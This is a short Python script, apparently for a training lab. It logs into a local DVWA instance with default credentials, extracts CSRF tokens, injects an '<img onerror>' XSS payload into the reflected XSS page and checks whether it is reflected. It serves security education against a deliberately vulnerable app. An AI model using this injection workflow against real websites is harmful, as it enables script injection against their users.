#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DVWA Automated Login Script
---------------------------
For educational purposes only. 

This script demonstrates how to:
- Maintain sessions and cookies using `requests`
- Extract CSRF tokens with `BeautifulSoup`
- Automate a login workflow into DVWA
- Inject a payload into the reflected XSS form.
- Check response to confirm if the payload appears (proof of XSS).

Do NOT use this script against systems you do not own or have explicit permission to test.
"""


import requests
from bs4 import BeautifulSoup

# DVWA URLs
base_url = "http://127.0.0.1/DVWA"
login_url = f"{base_url}/login.php"
xss_url = f"{base_url}/vulnerabilities/xss_r/"

# Start session
session = requests.Session()

# --- STEP 1: Login ---
login_page = session.get(login_url)
soup = BeautifulSoup(login_page.text, "html.parser")
user_token = soup.find("input", {"name": "user_token"})["value"]

credentials = {
    "username": "admin",
    "password": "password",  # cracked password
    "Login": "Login",
    "user_token": user_token
}
session.post(login_url, data=credentials)

print("[+] Login successful!")

# --- STEP 2: Go to XSS Reflected page ---
xss_page = session.get(xss_url)
soup = BeautifulSoup(xss_page.text, "html.parser")
xss_token = soup.find("input", {"name": "user_token"})["value"]

# --- STEP 3: Inject payload ---
payload = "<img src=x onerror=alert('XSS_Demo_Triggered')>"
data = {
    "name": payload,
    "user_token": xss_token
}

response = session.get(xss_url, params=data)

# --- STEP 4: Check ---
if "XSS_Demo_Triggered" in response.text:
    print("[+] XSS payload reflected!")
else:
    print("[-] Injection failed or escaped.")
    print(response.text[:500])
